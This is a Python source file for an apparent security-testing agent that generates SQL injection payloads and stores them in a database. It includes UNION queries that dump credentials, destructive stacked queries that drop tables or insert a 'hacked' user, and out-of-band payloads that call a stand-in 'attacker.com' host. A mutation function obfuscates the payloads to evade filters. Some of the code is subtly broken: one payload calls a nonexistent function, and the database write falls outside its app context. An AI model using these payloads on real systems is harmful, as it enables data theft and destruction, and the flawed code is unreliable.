import random
import logging
from agents.base.base_agent import BaseAgent
# Removed direct import of app to prevent duplicate execution deadlock

logger = logging.getLogger('app')

class PayloadGeneratorAgent(BaseAgent):
    def __init__(self, **kwargs):
        super().__init__(
            agent_name="MaliciousPayloadGeneratorAgent",
            agent_type="payload_generator_agent",
            version="1.0.0",
            **kwargs
        )
        self.templates = {
            "UNION": [
                "' UNION SELECT null, username, password FROM users --",
                "' uNiOn SeLeCt 1,2,3,4 --",
                "1' UNION SELECT @@version, user() --"
            ],
            "Error-Based": [
                "' AND EXTRAS(1)=1 --",
                "' AND extractvalue(1, concat(0x3a, version())) --",
                "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
            ],
            "Time-Based": [
                "' AND SLEEP(5) --",
                "'; WAITFOR DELAY '0:0:5' --",
                "' AND pg_sleep(5) --"
            ],
            "Stacked": [
                "1; DROP TABLE users; --",
                "admin'; UPDATE settings SET value='0'; --",
                "1; INSERT INTO users (username, password) VALUES ('hacked', 'hacked') --"
            ],
            "OOB": [
                "'; EXEC master..xp_dirtree '\\\\attacker.com\\share' --",
                "' UNION SELECT LOAD_FILE('\\\\attacker.com\\share') --"
            ]
        }

    def mutate_payload(self, text, level):
        """Mutates a SQLi payload text based on mutation level complexity."""
        if level <= 0:
            return text
            
        mutated = text
        if level >= 1:
            # 1. Obfuscate space with comments
            mutated = mutated.replace(" ", "/**/")
            
        if level >= 2:
            # 2. Case mutation on SQL keywords
            keywords = ["UNION", "SELECT", "AND", "OR", "SLEEP", "WAITFOR", "DELAY", "DROP", "INSERT"]
            for kw in keywords:
                if kw in mutated:
                    # Randomize casing
                    cased = "".join(c.lower() if random.choice([True, False]) else c.upper() for c in kw)
                    mutated = mutated.replace(kw, cased)
                    
        return mutated

    def execute(self, message):
        payload = message.payload
        task = payload.get("task")
        
        if task == "generate_payloads" or payload.get("scheduled"):
            logger.info("[PayloadGeneratorAgent] Executing payload generation and mutations.")
            
            category = payload.get("category", "UNION")
            mut_level = payload.get("mutation_level", random.choice([0, 1, 2]))
            
            # Select template
            options = self.templates.get(category, self.templates["UNION"])
            chosen = random.choice(options)
            
            # Mutate
            mutated_val = self.mutate_payload(chosen, mut_level)
            
            difficulty_map = {0: "low", 1: "medium", 2: "high"}
            difficulty = difficulty_map.get(mut_level, "low")
            
            try:
                from app.extensions import db
                from app.models.payload import Payload
                from agents.orchestrator.orchestrator import OrchestratorAgent
                app_instance = OrchestratorAgent().app
                if app_instance:
                    with app_instance.app_context():
                        # Check if payload already exists in DB
                        exists = Payload.query.filter_by(payload=mutated_val).first()
                    if not exists:
                        db_payload = Payload(
                            name=f"Generated {category} SQLi",
                            payload=mutated_val,
                            difficulty=difficulty,
                            category="SQL Injection",
                            mutation_level=mut_level
                        )
                        db.session.add(db_payload)
                        db.session.commit()
                        logger.info(f"[PayloadGeneratorAgent] Generated payload written to database: {mutated_val}")
            except Exception as e:
                logger.error(f"[PayloadGeneratorAgent] Failed to write payload to DB: {str(e)}")
